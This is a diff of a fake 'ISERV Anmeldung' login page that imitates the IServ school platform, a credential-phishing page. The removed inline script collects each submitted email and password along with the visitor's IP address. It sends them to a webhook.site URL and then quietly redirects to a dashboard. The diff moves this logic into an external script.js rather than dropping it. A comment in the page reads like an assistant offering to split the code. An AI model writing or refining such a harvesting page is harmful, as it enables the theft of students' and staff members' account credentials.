@@ -5,6 +5,7 @@
   <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
   <title>ISERV Anmeldung</title>
   <style>
+    /* Dein CSS hier wie vorher – falls du willst, kann ich es auch splitten */
     body {
       margin: 0;
       font-family: Arial, sans-serif;
@@ -175,66 +176,7 @@
     </div>
   </div>
 
-  <script>
-    document.addEventListener('DOMContentLoaded', () => {
-      const signInButton = document.getElementById('signInButton');
-      if (signInButton) {
-        signInButton.addEventListener('click', signIn);
-      } else {
-        console.error('Anmelden-Button nicht gefunden.');
-      }
-    });
-
-    async function signIn() {
-      const email = document.getElementById('email').value;
-      const password = document.getElementById('password').value;
-      const gotcha = document.querySelector('input[name="_gotcha"]').value;
-
-      if (!email || !password) {
-        alert('Bitte fülle alle Felder aus.');
-        return;
-      }
-
-      if (gotcha) {
-        console.log('Bot erkannt!');
-        setTimeout(() => {
-          window.location.href = 'dashboard.html';
-        }, 1000);
-        return;
-      }
-
-      const lastSignIn = localStorage.getItem('lastSignIn');
-      if (lastSignIn && Date.now() - parseInt(lastSignIn) < 30000) {
-        alert('Bitte warte 30 Sekunden vor der nächsten Anmeldung.');
-        return;
-      }
-
-      try {
-        let ip_address = 'Unbekannt';
-        try {
-          const response = await fetch('https://api.ipify.org?format=json');
-          const data = await response.json();
-          ip_address = data.ip;
-        } catch (err) {
-          console.error('Fehler beim Abrufen der IP-Adresse:', err);
-        }
-
-        const payload = {
-          email,
-          password,
-          ip_address,
-          timestamp: new Date().toISOString()
-        };
-
-        await fetch("https://webhook.site/3ec114ae-513b-412c-8b0c-64af65eb946a", {
-          method: "POST",
-          headers: { "Content-Type": "application/json" },
-          body: JSON.stringify(payload)
-        });
-
-        localStorage.setItem('lastSignIn', Date.now().toString());
-        window.location.href = 'dashboard.html';
-
-      } catch (err) {
-        console.error('Fehler beim Senden:', err);
-        alert('Ein
+  <!-- Wichtig: Script am Ende einbinden -->
+  <script src="script.js"></script>
+</body>
+</html>
